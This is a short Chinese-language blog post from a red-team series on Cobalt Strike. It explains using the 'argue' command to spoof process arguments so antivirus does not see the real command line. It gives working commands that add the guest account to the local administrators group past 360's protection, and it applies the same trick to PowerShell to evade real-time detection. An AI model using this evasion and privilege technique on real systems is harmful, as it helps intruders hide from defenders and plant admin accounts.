---
layout:     post
title:    Cobalt Strike系列8
subtitle:   argue命令进行参数污染
date:       2019-12-03
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 渗透测试
    - 红队
    - 内网渗透
---
# Cobalt Strike系列8

### 简介
一个实用的小技巧，argue命令参数污染。  
需要administrator或者system权限。  
Usage:  
```
argue [command] [fake arguments]  
```
注意：  
这里的fake arguments要比原始的command长。  


### 实例
添加guest用户到管理员组，直接添加可以看到被360拦住了。  
![191203_1](/img/191203_guest.png)  
在cs中执行命令：  
```
argue net1 xxxxxxxxxxxxxxxxxxxxxxxxx
```
![191203_2](/img/191203_arguenet.png)  
然后输入argue命令查看列表，查看net1参数是否被污染。  
![191203_3](/img/191203_arguelist.png)  
这时候再执行命令，不能用shell来执行了，需要用execute。  
```
execute net1 localgroup administrators guest /add
``` 
然后在命令行中通过命令查看是否添加到管理员组：  
```
net user guest
```
可以看到已经成功添加了。  
![191203_4](/img/191203_localgroup.png)   
实际中不仅仅可以用来这个，还可以用参数污染来进行powershell命令执行。   
```
argue powershell.exe xxxxxxxxxxxxxxxxxxxxxxxxx
```
这样也是能用来规避实时防御的检测。  
防止真实参数直接传入进程执行被检测。  


### 总结
目前测试还是可以用的，但是后面可能会被检测。  
事实上不依赖CobaltStrike，使用其他argue参数污染工具可以达到同样的效果，甚至能用更好的逃避查杀的效果，这里这是刚好有这个功能介绍一下这个思路。  
